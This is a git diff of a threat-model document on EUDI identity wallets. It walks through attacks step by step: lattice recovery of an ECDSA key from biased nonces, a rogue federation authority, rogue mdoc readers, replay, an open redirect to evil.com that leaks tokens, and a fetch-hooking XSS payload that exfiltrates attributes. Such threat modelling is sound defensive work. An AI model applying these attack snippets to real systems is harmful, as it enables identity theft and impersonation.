 The framework constructs a lattice from the biased nonce equations and applies LLL or BKZ lattice reduction algorithms. This is a well-studied cryptographic attack first demonstrated by Howgrave-Graham and Smart (2001). Modern implementations can recover a P-256 private key from ~200 signatures with 2+ bit nonce bias in minutes on commodity hardware.
 
@@ -23153,7 +23807,7 @@ n_sigs = 200
 tuples = [(r_i, s_i, h_i) for r_i, s_i, h_i in collected_signatures]
 
 # Construct lattice basis matrix B (dimension: n_sigs+2)
-# Each row encodes the HNP relation: |t_i - d * a_i| < n/2^bias_bits
+# Each row encodes the HNP relation: |t_i - d * a_i| &lt; n/2^bias_bits
 B = matrix(ZZ, n_sigs + 2, n_sigs + 2)
 for i in range(n_sigs):
     a_i = (inverse_mod(s_i, n) * r_i) % n    # coefficient of d
@@ -23177,14 +23831,16 @@ assert d_candidate * G == Q_public  # ⚠️ Key recovered
 **Artifact Produced:** Lattice reduction computation targeting the RP's private key `d`.
 
 </details>
-<details><summary><strong>7. Private key d recovered from lattice output</strong></summary>
+<details>
+<summary><strong>7. Private key d recovered from lattice output</strong></summary>
 
 The lattice reduction produces the RP's WRPAC private key `d`. The attacker verifies the recovered key by checking that it correctly derives the RP's known public key. This is equivalent to a full §29.2.3 (WRPAC Private Key Compromise) — but achieved without any server-side breach, insider access, or HSM compromise. The attack is purely cryptanalytic.
 
 **Artifact Produced:** Recovered WRPAC private key `d` — equivalent to full §29.2.3 (WRPAC Private Key Compromise).
 
 </details>
-<details><summary><strong>8. Attacker forges JARs with recovered private key</strong></summary>
+<details>
+<summary><strong>8. Attacker forges JARs with recovered private key</strong></summary>
 
 With the RP's private key, the attacker can forge JARs indistinguishable from legitimate ones — requesting any attributes from any Wallet. The attacker can also sign `client_assertion` JWTs for client authentication at the AS, or create fake WRPACs if the key is the WRPAC signing key.
 
@@ -23228,7 +23884,8 @@ With the RP's private key, the attacker can forge JARs indistinguishable from le
 **Artifact Produced:** Forged JARs signed with recovered key — ready for submission to any Wallet or Verifier.
 
 </details>
-<details><summary><strong>9. Verifier accepts forged JAR — full RP impersonation</strong></summary>
+<details>
+<summary><strong>9. Verifier accepts forged JAR — full RP impersonation</strong></summary>
 
 The attacker presents a forged JAR to a Wallet or Verifier. The Verifier validates the JAR signature against the RP's public key (from the WRPAC or LoTE) and finds it valid. The Wallet presents the user's credentials to the attacker. This is complete RP impersonation — the attacker can harvest PID attributes from users who trust the legitimate RP's identity.
 
@@ -23311,7 +23968,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Trust Anchor issues Subordinate Statement for Intermediate Authority</strong></summary>
+<details>
+<summary><strong>1. Trust Anchor issues Subordinate Statement for Intermediate Authority</strong></summary>
 
 The Trust Anchor (e.g., the EU-level EUDIW Trust Anchor or an MS-level authority) issues a Subordinate Statement — a signed JWT that cryptographically vouches for the Intermediate Authority (IA). This JWT contains the IA's public key, its metadata (entity type, jurisdiction, supported protocols), and constraints on what the IA is permitted to delegate. The Subordinate Statement is signed with the Trust Anchor's private key.
 
@@ -23342,7 +24000,8 @@ The Trust Anchor (e.g., the EU-level EUDIW Trust Anchor or an MS-level authority
 **Artifact Produced:** Trust Anchor → Intermediate Authority Subordinate Statement (signed JWT with IA's public key and delegation constraints).
 
 </details>
-<details><summary><strong>2. Intermediate Authority issues Subordinate Statement for entity</strong></summary>
+<details>
+<summary><strong>2. Intermediate Authority issues Subordinate Statement for entity</strong></summary>
 
 The Intermediate Authority issues its own Subordinate Statement for each entity in its jurisdiction — RPs, PID Providers, Wallet Providers. This JWT is signed with the IA's private key and contains the entity's public key, metadata, and Trust Marks. The federation hierarchy is now complete: Entity → IA → TA.
 
@@ -23377,7 +24036,8 @@ The Intermediate Authority issues its own Subordinate Statement for each entity 
 **Artifact Produced:** Intermediate Authority → Entity Subordinate Statement (signed JWT with entity's public key and metadata).
 
 </details>
-<details><summary><strong>3. RP/Wallet resolves trust chain and validates all signatures</strong></summary>
+<details>
+<summary><strong>3. RP/Wallet resolves trust chain and validates all signatures</strong></summary>
 
 When a Wallet or RP needs to verify an entity's trust status, it resolves the full chain from the entity's `.well-known/openid-federation` endpoint up to the Trust Anchor. At each level, it fetches the Subordinate Statement from the superior authority, verifies the JWS signature, and validates that the signing key matches the superior's published key. If every link validates, the entity is trusted.
 
@@ -23422,7 +24082,8 @@ eyJhbGciOiJFUzI1NiIsImtpZCI6InRhLXJvb3Qta2V5In0...
 **Artifact Produced:** Verified trust chain with valid signatures at every link — entity is trusted.
 
 </details>
-<details><summary><strong>4. Attacker compromises Intermediate Authority's signing key</strong></summary>
+<details>
+<summary><strong>4. Attacker compromises Intermediate Authority's signing key</strong></summary>
 
 The attacker targets the weakest link in the federation hierarchy — an Intermediate Authority. Attack vectors include: (a) compromising the IA's signing key through a server breach; (b) exploiting a key management vulnerability in the IA's OID-FED implementation; (c) social engineering an insider at the IA to issue a fraudulent Subordinate Statement; (d) registering as a legitimate entity under the IA and then exploiting a bug in the IA's issuance API. In cross-border scenarios, the attacker may target IAs in Member States with weaker security postures.
 
@@ -23431,7 +24092,8 @@ The attacker targets the weakest link in the federation hierarchy — an Interme
 **Artifact Produced:** Control of an Intermediate Authority's signing key, or a session with the IA's Subordinate Statement issuance API.
 
 </details>
-<details><summary><strong>5. Attacker issues fraudulent Subordinate Statement for rogue entity</strong></summary>
+<details>
+<summary><strong>5. Attacker issues fraudulent Subordinate Statement for rogue entity</strong></summary>
 
 Using the compromised IA key, the attacker issues a Subordinate Statement that vouches for a rogue entity — either a fake PID Provider (to issue forged credentials) or a fake RP (to harvest user attributes). The Subordinate Statement is indistinguishable from a legitimate one because it is signed by the real IA key. The rogue entity's `.well-known/openid-federation` endpoint serves an Entity Statement containing the attacker's public keys and metadata. The attacker may also forge Trust Marks.
 
@@ -23466,14 +24128,16 @@ Using the compromised IA key, the attacker issues a Subordinate Statement that v
 **Artifact Produced:** A rogue entity with a cryptographically valid Subordinate Statement: Rogue Entity ← IA (compromised key).
 
 </details>
-<details><summary><strong>6. Rogue entity presents forged trust chain to target</strong></summary>
+<details>
+<summary><strong>6. Rogue entity presents forged trust chain to target</strong></summary>
 
 The rogue entity (operating as a fake PID Provider or fake RP) presents its trust chain to the target. If the rogue entity is a PID Provider, it presents the chain when a Wallet resolves the provider's trust status during credential issuance. If the rogue entity is an RP, it presents the chain when a Wallet resolves the RP's trust status during a presentation request.
 
 **Artifact Produced:** Rogue entity's trust chain presented for resolution: Rogue → IA → TA.
 
 </details>
-<details><summary><strong>7. Target resolves chain — all signatures validate</strong></summary>
+<details>
+<summary><strong>7. Target resolves chain — all signatures validate</strong></summary>
 
 The target (Wallet or RP) resolves the chain and verifies every signature. The Subordinate Statement from IA to Rogue Entity is valid (signed by the real IA key). The Subordinate Statement from TA to IA is valid (the IA is legitimate). Every signature checks out — the chain is cryptographically indistinguishable from a legitimate one. Detection is extremely difficult because there is no signature anomaly.
 
@@ -23516,7 +24180,8 @@ The target (Wallet or RP) resolves the chain and verifies every signature. The S
 **Artifact Produced:** Chain resolution result: all signatures valid, chain terminates at trusted Trust Anchor.
 
 </details>
-<details><summary><strong>8. Target trusts rogue entity — credential forgery or identity harvesting</strong></summary>
+<details>
+<summary><strong>8. Target trusts rogue entity — credential forgery or identity harvesting</strong></summary>
 
 The target accepts the rogue entity as trusted. If the rogue entity is a PID Provider, it can now issue credentials that pass verification at any RP that trusts the same Trust Anchor. If the rogue entity is an RP, it can request wallet presentations from any user whose Wallet resolves the federation hierarchy. Detection requires cross-referencing resolved entities against the LoTE/EFDA — any OID-FED entity not present in the authoritative list should trigger a manual review.
 
@@ -23591,7 +24256,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Legitimate reader sends mdoc request with ReaderAuth</strong></summary>
+<details>
+<summary><strong>1. Legitimate reader sends mdoc request with ReaderAuth</strong></summary>
 
 In a correctly implemented ISO 18013-5 proximity flow, the Reader (RP's NFC/BLE terminal) presents a `ReaderAuth` structure containing its Reader Certificate and a signature over the `SessionTranscript`. This authenticates the reader to the Wallet — proving that the requesting entity is a registered, authorised reader with a valid IACA-rooted certificate chain.
 
@@ -23599,7 +24265,7 @@ In a correctly implemented ISO 18013-5 proximity flow, the Reader (RP's NFC/BLE 
 ; ReaderAuth structure (CBOR diagnostic notation)
 ; COSE_Sign1 = [protected, unprotected, payload, signature]
 ReaderAuth = [
-  << { 1: -7 } >>,          ; protected: alg = ES256
+  &lt;< { 1: -7 } >>,          ; protected: alg = ES256
   { 33: [                    ; unprotected: x5chain (Reader Cert chain)
     h'3082...Reader_Cert',   ;   leaf: Reader Certificate
     h'3082...IACA_Int_CA',   ;   intermediate: IACA Intermediate CA
@@ -23613,21 +24279,24 @@ ReaderAuth = [
 **Artifact Produced:** mdoc request containing `ReaderAuth` structure with Reader Certificate and `SessionTranscript` signature.
 
 </details>
-<details><summary><strong>2. Wallet validates Reader Certificate chain against IACA root</strong></summary>
+<details>
+<summary><strong>2. Wallet validates Reader Certificate chain against IACA root</strong></summary>
 
 The Wallet extracts the Reader Certificate from the `ReaderAuth` and validates the full certificate chain: leaf → intermediate(s) → IACA root. The Wallet checks that the IACA root is in its trusted set, that the chain is complete, and that no certificate in the chain has been revoked (via CRL or OCSP). This is the Wallet-side analogue of the RP's LoTE/Trust Anchor validation (§29.2.22).
 
 **Artifact Produced:** Certificate chain validation result: valid chain up to trusted IACA root.
 
 </details>
-<details><summary><strong>3. Wallet displays authenticated reader identity for user consent</strong></summary>
+<details>
+<summary><strong>3. Wallet displays authenticated reader identity for user consent</strong></summary>
 
 After successful chain validation, the Wallet renders a consent screen showing the authenticated reader's identity (organisation name, country, purpose — derived from the Reader Certificate's fields). The user sees *who* is requesting their data, not just *what* data is being requested. This authenticated identity display is the key privacy protection — it prevents anonymous or unregistered readers from silently harvesting data.
 
 **Artifact Produced:** Consent screen with authenticated reader identity and requested attribute list.
 
 </details>
-<details><summary><strong>4. Rogue reader sends mdoc request without ReaderAuth</strong></summary>
+<details>
+<summary><strong>4. Rogue reader sends mdoc request without ReaderAuth</strong></summary>
 
 The attacker operates a rogue reader terminal (e.g., a modified NFC terminal at a venue entrance, a fake ID checkpoint) that either omits `ReaderAuth` entirely or presents a self-signed Reader Certificate not chained to any IACA root. The rogue reader sends a standard mdoc `DeviceRetrievalRequest` with the `ReaderAuth` field absent or containing an invalid signature.
 
@@ -23652,7 +24321,8 @@ DeviceRetrievalRequest = {
 **Artifact Produced:** mdoc request with missing or invalid `ReaderAuth` — no authenticated reader identity available.
 
 </details>
-<details><summary><strong>5. Wallet skips ReaderAuth validation — treats it as optional</strong></summary>
+<details>
+<summary><strong>5. Wallet skips ReaderAuth validation — treats it as optional</strong></summary>
 
 If the Wallet's mdoc implementation treats `ReaderAuth` as optional (ISO 18013-5 does not mandate it in all configurations — `ReaderAuth` is "SHOULD" not "SHALL" in some profiles), the Wallet proceeds with the flow. The user sees no authenticated RP identity — or worse, sees a generic "Unknown Reader" label that they dismiss. The Wallet's consent screen lacks the trust signal that would normally help the user make an informed decision.
 
@@ -23696,7 +24366,8 @@ If the Wallet's mdoc implementation treats `ReaderAuth` as optional (ISO 18013-5
 **Artifact Produced:** Wallet proceeds without reader authentication — consent screen shows "Unknown Reader" or no reader identity.
 
 </details>
-<details><summary><strong>6. Wallet releases mDL attributes to rogue reader</strong></summary>
+<details>
+<summary><strong>6. Wallet releases mDL attributes to rogue reader</strong></summary>
 
 The user, lacking the authenticated reader identity signal, may still consent (especially in high-pressure situations: border crossings, event entry, police checks). The Wallet constructs a `DeviceResponse` containing the requested attributes and `DeviceSignature`, and transmits it to the rogue reader via NFC/BLE. The rogue reader now possesses the user's mDL attributes (name, date of birth, portrait, driving privileges, address) without having proven its identity or authorisation.
 
@@ -23805,14 +24476,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Rogue reader solicits DeviceResponse from victim's Wallet</strong></summary>
+<details>
+<summary><strong>1. Rogue reader solicits DeviceResponse from victim's Wallet</strong></summary>
 
 The attacker operates a rogue reader (§29.2.28) or is positioned network-adjacent to a legitimate mdoc exchange (e.g., at a point-of-sale terminal with compromised firmware). The rogue reader sends a valid mdoc `DeviceRetrievalRequest` to the victim's Wallet. The victim consents (either because `ReaderAuth` was bypassed per §29.2.28, or because the reader presents a legitimate-looking certificate).
 
 **Artifact Produced:** mdoc `DeviceRetrievalRequest` sent to the victim's Wallet.
 
 </details>
-<details><summary><strong>2. Victim's Wallet returns DeviceResponse with DeviceSignature</strong></summary>
+<details>
+<summary><strong>2. Victim's Wallet returns DeviceResponse with DeviceSignature</strong></summary>
 
 The Wallet constructs a `DeviceResponse` containing: (a) the requested mDL attributes (IssuerSignedItems); (b) the `DeviceSignature` — a COSE_Sign1 over the `SessionTranscript`, proving the Wallet's `DeviceKey` controls the session. The `SessionTranscript` cryptographically binds the response to this specific session (device engagement nonces, reader key). The victim has no knowledge that their data will be replayed.
 
@@ -23829,8 +24502,8 @@ DeviceResponse = {
     "deviceSigned": {
       "nameSpaces": {},
       "deviceAuth": {
-        "deviceSignature": [     ;  <-- COSE_Sign1 — the critical field
-          << { 1: -7 } >>,      ;    protected: alg = ES256
+        "deviceSignature": [     ;  &lt;-- COSE_Sign1 — the critical field
+          &lt;< { 1: -7 } >>,      ;    protected: alg = ES256
           {},                    ;    unprotected
           nil,                   ;    payload: externally supplied (SessionTranscript)
           h'3045...DevKeySig'    ;    ECDSA sig over SessionTranscript using DeviceKey
@@ -23846,14 +24519,16 @@ DeviceResponse = {
 **Artifact Produced:** Complete `DeviceResponse` containing IssuerSignedItems, `DeviceSignature`, and `SessionTranscript` binding.
 
 </details>
-<details><summary><strong>3. Attacker presents intercepted DeviceResponse at legitimate RP</strong></summary>
+<details>
+<summary><strong>3. Attacker presents intercepted DeviceResponse at legitimate RP</strong></summary>
 
 The attacker takes the captured `DeviceResponse` and presents it to a legitimate RP's mdoc verification endpoint — either in a proximity flow (different NFC session) or via an online OID4VP bridge that accepts mdoc DeviceResponses. The attacker claims the victim's identity: they present the victim's name, date of birth, portrait, and driving privileges as their own.
 
 **Artifact Produced:** Replayed `DeviceResponse` submitted to the legitimate RP's verification endpoint.
 
 </details>
-<details><summary><strong>4. RP processes mDL attributes without verifying DeviceSignature</strong></summary>
+<details>
+<summary><strong>4. RP processes mDL attributes without verifying DeviceSignature</strong></summary>
 
 The RP's mdoc verification logic parses the `DeviceResponse`, extracts the IssuerSignedItems, and verifies the Issuer's signature (MSO signature chain to the Document Signer certificate). However, the RP *skips* `DeviceSignature` verification — the critical step that proves the presenter controls the `DeviceKey`. Without this check, the RP cannot distinguish between the legitimate holder and anyone who possesses a copy of the `DeviceResponse`. This is the mdoc equivalent of accepting an SD-JWT VC without verifying the KB-JWT.
 
@@ -23889,7 +24564,8 @@ async function verifyMdocResponse(deviceResponse) {
 **Artifact Produced:** RP parses mDL attributes from the replayed response — issuer signature validates but session binding is not checked.
 
 </details>
-<details><summary><strong>5. RP authenticates attacker as victim's identity</strong></summary>
+<details>
+<summary><strong>5. RP authenticates attacker as victim's identity</strong></summary>
 
 Because `DeviceSignature` was not verified, the RP has no proof that the presenter is the legitimate holder. The RP creates an authenticated session using the victim's identity — the attacker now has access to any service that relies on this mDL verification. In financial contexts (§21), this enables account opening under a stolen identity. In government contexts, this enables fraudulent service access.
 
@@ -23964,14 +24640,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Legitimate reader presents Reader Certificate with full IACA chain</strong></summary>
+<details>
+<summary><strong>1. Legitimate reader presents Reader Certificate with full IACA chain</strong></summary>
 
 In the normal flow, the reader presents a Reader Certificate as part of the `ReaderAuth` structure. This certificate is accompanied by a chain of intermediate certificates leading to the IACA root — the Issuing Authority CA that is the trust anchor for mdoc reader authentication in that jurisdiction. The chain typically has 2–3 certificates: leaf (Reader Certificate) → intermediate (national or regional CA) → IACA root.
 
 **Artifact Produced:** `ReaderAuth` structure containing Reader Certificate with full X.509 chain to IACA root.
 
 </details>
-<details><summary><strong>2. Wallet validates full certificate chain to IACA root</strong></summary>
+<details>
+<summary><strong>2. Wallet validates full certificate chain to IACA root</strong></summary>
 
 The Wallet validates each link in the chain: verifies the leaf certificate's signature against the intermediate's public key, verifies the intermediate's signature against the IACA root's public key, and checks that the IACA root is in the Wallet's trusted root store. The Wallet also validates that the certificates have not expired (checking `notBefore`/`notAfter` fields) and that the chain uses acceptable signature algorithms (e.g., ECDSA P-256 or P-384).
 
@@ -24002,7 +24680,8 @@ The Wallet validates each link in the chain: verifies the leaf certificate's sig
 **Artifact Produced:** Chain validation result: all signatures valid, all certificates within validity period, root is trusted.
 
 </details>
-<details><summary><strong>3. Wallet checks revocation status via CRL/OCSP</strong></summary>
+<details>
+<summary><strong>3. Wallet checks revocation status via CRL/OCSP</strong></summary>
 
 After chain validation, the Wallet checks whether any certificate in the chain has been revoked. This requires either downloading the Certificate Revocation List (CRL) from the URL in the certificate's CRL Distribution Point extension, or querying an OCSP responder. This step is critical but expensive in proximity flows (requires network connectivity, which may not be available in offline NFC scenarios).
 
@@ -24030,7 +24709,8 @@ CertificateList:
 **Artifact Produced:** Revocation status check: all certificates in chain are not revoked.
 
 </details>
-<details><summary><strong>4. Rogue reader presents unrooted or compromised certificate chain</strong></summary>
+<details>
+<summary><strong>4. Rogue reader presents unrooted or compromised certificate chain</strong></summary>
 
 The attacker constructs a Reader Certificate with a valid-looking but unrooted chain. Attack variants include: (a) a self-signed chain with a plausible issuer DN (e.g., "DE IACA Root CA" — which looks legitimate but is attacker-generated); (b) a chain that terminates at an expired IACA root the Wallet should have removed from its trust store; (c) a chain where the leaf certificate has been signed by a legitimately-issued intermediate certificate that has since been revoked but whose revocation the Wallet doesn't check.
 
@@ -24044,14 +24724,16 @@ Leaf: CN=Rogue Reader, O=Fake Authority
 **Artifact Produced:** Forged Reader Certificate chain with plausible but unrooted or revoked certificates.
 
 </details>
-<details><summary><strong>5. Wallet accepts compromised chain due to validation gaps</strong></summary>
+<details>
+<summary><strong>5. Wallet accepts compromised chain due to validation gaps</strong></summary>
 
 The Wallet's chain validation fails to detect the attack due to one or more implementation gaps: (a) the Wallet does not check CRL/OCSP (common in offline-first mdoc implementations that prioritise NFC speed over revocation checking); (b) the Wallet accepts chains terminating at IACA roots that have expired but are still in the trust store (stale trust store); (c) the Wallet does not validate the chain at all — it only checks that the `ReaderAuth` signature is valid against the *presented* leaf certificate, without tracing the chain to a trusted root.
 
 **Artifact Produced:** Wallet accepts the rogue reader's certificate chain — no validation failure detected.
 
 </details>
-<details><summary><strong>6. Wallet releases mDL attributes to rogue reader with compromised trust</strong></summary>
+<details>
+<summary><strong>6. Wallet releases mDL attributes to rogue reader with compromised trust</strong></summary>
 
 The Wallet displays the rogue reader's identity (from the forged certificate's fields) as if it were a legitimate, IACA-registered reader. The user sees a plausible reader identity and consents. The Wallet releases the `DeviceResponse` with mDL attributes and `DeviceSignature`. The rogue reader now has the user's identity data, having bootstrapped a trusted reader identity without going through the legitimate IACA registration process.
 
@@ -24136,7 +24818,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker distributes crafted verification link</strong></summary>
+<details>
+<summary><strong>1. Attacker distributes crafted verification link</strong></summary>
 
 The attacker constructs a URL to the RP's verification initiation endpoint that includes an attacker-controlled redirect target. Common injection points: (a) a `return_to` or `redirect_uri` query parameter that the RP uses to redirect the user after verification; (b) a `state` parameter whose value is decoded to a URL; (c) a `Referer` header that the RP trusts as the return destination.
 
@@ -24149,14 +24832,16 @@ The attacker distributes this crafted link via email, SMS, or social media — t
 **Artifact Produced:** Crafted verification URL with attacker-controlled redirect target embedded in a legitimate RP domain link.
 
 </details>
-<details><summary><strong>2. User initiates verification carrying attacker's redirect parameter</strong></summary>
+<details>
+<summary><strong>2. User initiates verification carrying attacker's redirect parameter</strong></summary>
 
 The user clicks the crafted link and is directed to the RP's legitimate verification initiation page. The RP starts a new OID4VP session, storing the `return_to` parameter in the session context (or passing it through as a query parameter). The user sees the familiar RP domain in their browser's URL bar — there is no visual indication that the redirect target has been injected by an attacker.
 
 **Artifact Produced:** Active verification session at the legitimate RP with attacker-controlled `return_to` parameter stored in session state.
 
 </details>
-<details><summary><strong>3. Wallet presents credentials via direct_post</strong></summary>
+<details>
+<summary><strong>3. Wallet presents credentials via direct_post</strong></summary>
 
 The user's Wallet receives the OID4VP presentation request (via QR code or deep link), displays the RP's WRPAC identity and requested attributes, and the user consents. The Wallet submits the VP to the RP's `response_uri` via `direct_post`. The credential exchange is completely legitimate — the attacker has not tampered with the VP, the DCQL query, or the cryptographic flow.
 
@@ -24181,14 +24866,16 @@ vp_token=eyJhbGciOiJFUzI1NiIsInR5cCI6InZjK3NkLWp3dCJ9.eyJpc3MiOi
 **Artifact Produced:** VP submitted to the legitimate RP's `response_uri` — credential exchange is genuine.
 
 </details>
-<details><summary><strong>4. RP processes VP and verifies credentials successfully</strong></summary>
+<details>
+<summary><strong>4. RP processes VP and verifies credentials successfully</strong></summary>
 
 The RP receives the VP, verifies the SD-JWT VC or mdoc DeviceResponse, checks the nonce binding, validates the issuer signature against the LoTE trust store, and authenticates the user. The verification succeeds — the RP has a valid, verified identity. The user now has an authenticated session at the RP.
 
 **Artifact Produced:** Authenticated session created from legitimate VP verification.
 
 </details>
-<details><summary><strong>5. RP constructs redirect from unvalidated parameter</strong></summary>
+<details>
+<summary><strong>5. RP constructs redirect from unvalidated parameter</strong></summary>
 
 After processing the VP, the RP constructs a redirect to return the user to their original context. If the RP naively uses the `return_to` parameter from the session (or decodes the `state` to a URL), the redirect target is the attacker's phishing site. The RP may append session tokens, response codes, or authentication state to the redirect URL as query parameters — leaking these directly to the attacker's server.
 
@@ -24200,21 +24887,24 @@ Location: https://evil.com/post-verify?token=abc123&session_id=s_9x8w7v
 **Artifact Produced:** HTTP 302 redirect to attacker-controlled URL, potentially leaking session tokens in URL parameters.
 
 </details>
-<details><summary><strong>6. Browser follows redirect to phishing site</strong></summary>
+<details>
+<summary><strong>6. Browser follows redirect to phishing site</strong></summary>
 
 The browser automatically follows the `302` redirect. The user sees the URL change but may not notice the domain switch — especially on mobile devices where the URL bar is truncated or auto-hidden after navigation. The user's psychological state is critical: they just completed a legitimate EUDI verification seconds ago, establishing maximum trust. The redirect feels like a natural continuation of the flow.
 
 **Artifact Produced:** User's browser navigated to attacker-controlled phishing site with post-verification trust context intact.
 
 </details>
-<details><summary><strong>7. Phishing site captures leaked session tokens</strong></summary>
+<details>
+<summary><strong>7. Phishing site captures leaked session tokens</strong></summary>
 
 If the RP appended session tokens or authentication state to the redirect URL, the attacker's server captures these from the URL parameters. The attacker now possesses the RP's session token and can potentially hijack the user's authenticated session at the legitimate RP — accessing accounts, initiating transactions, or exfiltrating data.
 
 **Artifact Produced:** Captured session tokens (if leaked via URL parameters) enabling potential session hijacking at the legitimate RP.
 
 </details>
-<details><summary><strong>8. Phishing page harvests additional credentials</strong></summary>
+<details>
+<summary><strong>8. Phishing page harvests additional credentials</strong></summary>
 
 The phishing site displays a page mimicking the RP's post-login UI (dashboard, account summary, transaction confirmation screen). Because the user just completed a legitimate EUDI verification, they are psychologically primed to trust the page. The phishing page requests the user's banking password, OTP code, or additional personal information under the pretext of "completing account setup" or "verifying additional details."
 
@@ -24344,7 +25034,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP sends legitimate DCQL query to intermediary</strong></summary>
+<details>
+<summary><strong>1. RP sends legitimate DCQL query to intermediary</strong></summary>
 
 In the normal Model C/D architecture (§26.6), the RP's backend sends an API call to the intermediary's verification endpoint, specifying the exact attributes needed in DCQL format. The query is scoped to the minimum set registered in the RP's WRPRC — typically just `family_name` and `date_of_birth` for an age verification use case.
 
@@ -24358,28 +25049,32 @@ In the normal Model C/D architecture (§26.6), the RP's backend sends an API cal
 **Artifact Produced:** Outbound API call from RP to intermediary with WRPRC-scoped DCQL query.
 
 </details>
-<details><summary><strong>2. Intermediary constructs JAR from RP's query</strong></summary>
+<details>
+<summary><strong>2. Intermediary constructs JAR from RP's query</strong></summary>
 
 The intermediary receives the RP's API call and constructs a signed JAR (JWT-based Authorization Request) containing the DCQL query. The JAR is signed with the intermediary's own WRPAC (or the RP's, depending on the deployment model). In the normal flow, the intermediary faithfully transcribes the RP's query into the JAR without adding or removing claims.
 
 **Artifact Produced:** Signed JAR containing the RP's original 2-attribute DCQL query.
 
 </details>
-<details><summary><strong>3. Intermediary sends presentation request to Wallet</strong></summary>
+<details>
+<summary><strong>3. Intermediary sends presentation request to Wallet</strong></summary>
 
 The intermediary delivers the signed JAR to the Wallet via the standard OID4VP flow — either via `request_uri` (cross-device) or `openid4vp://` deep link (same-device). The Wallet receives a presentation request listing exactly 2 attributes: `family_name` and `date_of_birth`.
 
 **Artifact Produced:** Presentation request delivered to the Wallet with 2 WRPRC-scoped attributes.
 
 </details>
-<details><summary><strong>4. Wallet displays consent screen with correct attribute set</strong></summary>
+<details>
+<summary><strong>4. Wallet displays consent screen with correct attribute set</strong></summary>
 
 The Wallet renders a consent screen listing the 2 requested attributes alongside the RP's identity (from the WRPAC in the JAR). The user reviews the request and consents. In the normal flow, the attribute set matches the RP's registered scope — the data minimisation principle is respected.
 
 **Artifact Produced:** User consent for `family_name` + `date_of_birth` — correctly scoped presentation.
 
 </details>
-<details><summary><strong>5. Attacker injects XSS payload into RP frontend</strong></summary>
+<details>
+<summary><strong>5. Attacker injects XSS payload into RP frontend</strong></summary>
 
 The attacker exploits an XSS vulnerability on the RP's frontend (§29.2.17) or compromises the RP's API gateway. The injected JavaScript intercepts the API call body before it is sent to the intermediary. The XSS payload modifies the DCQL query by appending additional claims that the RP is not authorised to collect: `address`, `nationality`, and `personal_administrative_number` (PAN).
 
@@ -24410,7 +25105,8 @@ window.fetch = async function(url, opts) {
 **Artifact Produced:** XSS payload active on the RP's frontend, intercepting and modifying outbound API calls.
 
 </details>
-<details><summary><strong>6. Compromised RP sends inflated DCQL query to intermediary</strong></summary>
+<details>
+<summary><strong>6. Compromised RP sends inflated DCQL query to intermediary</strong></summary>
 
 The modified API call reaches the intermediary with the inflated DCQL query. The injection is difficult to detect because the API call originates from the RP's legitimate backend domain — the intermediary has no out-of-band way to know that the RP's frontend has been compromised. The inflated query now contains 5 attributes instead of the authorised 2.
 
@@ -24424,7 +25120,8 @@ The modified API call reaches the intermediary with the inflated DCQL query. The
 **Artifact Produced:** Inflated DCQL query containing 3 unauthorised claims beyond the RP's WRPRC scope.
 
 </details>
-<details><summary><strong>7. Intermediary merges untrusted input without validation</strong></summary>
+<details>
+<summary><strong>7. Intermediary merges untrusted input without validation</strong></summary>
 
 The intermediary's API naively merges the RP's JSON input into its server-side DCQL template without validating the claims against the RP's registered scope. The intermediary does not maintain a per-RP allowlist of permitted DCQL claims — it treats the RP as a trusted source and forwards whatever claims are requested. This is the EUDI equivalent of a prepared-statement bypass: the intermediary should parameterise the query, not concatenate it.
 
@@ -24460,21 +25157,24 @@ The intermediary's API naively merges the RP's JSON input into its server-side D
 **Artifact Produced:** Server-side DCQL template with injected claims — no validation against WRPRC scope.
 
 </details>
-<details><summary><strong>8. Intermediary sends over-scoped request to Wallet</strong></summary>
+<details>
+<summary><strong>8. Intermediary sends over-scoped request to Wallet</strong></summary>
 
 The intermediary constructs a JAR with the full inflated query (5 attributes) and sends it to the Wallet. The Wallet receives a presentation request that exceeds the RP's WRPRC authorisation — but the Wallet has no mechanism to detect this unless it implements WRPRC-based scope checking (§5.3), which is not universal across implementation maturity levels.
 
 **Artifact Produced:** Over-scoped presentation request delivered to the Wallet containing 5 attributes.
 
 </details>
-<details><summary><strong>9. Wallet displays consent screen with 5 attributes</strong></summary>
+<details>
+<summary><strong>9. Wallet displays consent screen with 5 attributes</strong></summary>
 
 The Wallet renders a consent screen listing all 5 attributes. Most users do not memorise which attributes each RP is authorised to request — they see a list and consent based on brand trust, not scope analysis. The user may notice the additional attributes (especially `address` and PAN), but the EUDI trust context (WRPAC identity verified, familiar RP brand) suppresses suspicion.
 
 **Artifact Produced:** Consent screen displaying 5 attributes — 3 beyond the RP's authorised scope.
 
 </details>
-<details><summary><strong>10. User consents to over-scoped request</strong></summary>
+<details>
+<summary><strong>10. User consents to over-scoped request</strong></summary>
 
 The user taps "Accept" on the consent screen. The Wallet constructs a VP containing all 5 disclosed attributes and submits it to the intermediary's `response_uri`. The intermediary forwards the full attribute set to the RP's compromised frontend. The data minimisation principle is violated — the RP now possesses attributes it was never authorised to collect.
 
@@ -24483,14 +25183,16 @@ The user taps "Accept" on the consent screen. The Wallet constructs a VP contain
 **Artifact Produced:** VP containing 5 attributes (2 authorised + 3 injected) delivered to the compromised RP.
 
 </details>
-<details><summary><strong>11. Intermediary returns all attributes to compromised RP</strong></summary>
+<details>
+<summary><strong>11. Intermediary returns all attributes to compromised RP</strong></summary>
 
 The intermediary delivers the full VP response to the RP's callback endpoint. The RP's legitimate application logic processes only `family_name` and `date_of_birth` — the over-collected attributes (`address`, `nationality`, PAN) exist in the API response but are invisible to the RP's own UI. The RP's application logs show a successful verification with no anomalies.
 
 **Artifact Produced:** Full VP response containing 5 attributes delivered to the RP's compromised frontend context.
 
 </details>
-<details><summary><strong>12. XSS payload exfiltrates over-collected attributes</strong></summary>
+<details>
+<summary><strong>12. XSS payload exfiltrates over-collected attributes</strong></summary>
 
 The XSS payload on the RP's frontend intercepts the verification response and extracts the over-collected data. The payload sends `address`, `nationality`, and PAN to an attacker-controlled server via a hidden `fetch()` call or image beacon. The exfiltration is silent — neither the user nor the RP's application logic detects it.
 
@@ -24594,21 +25296,24 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. RP generates request_uri with session identifier</strong></summary>
+<details>
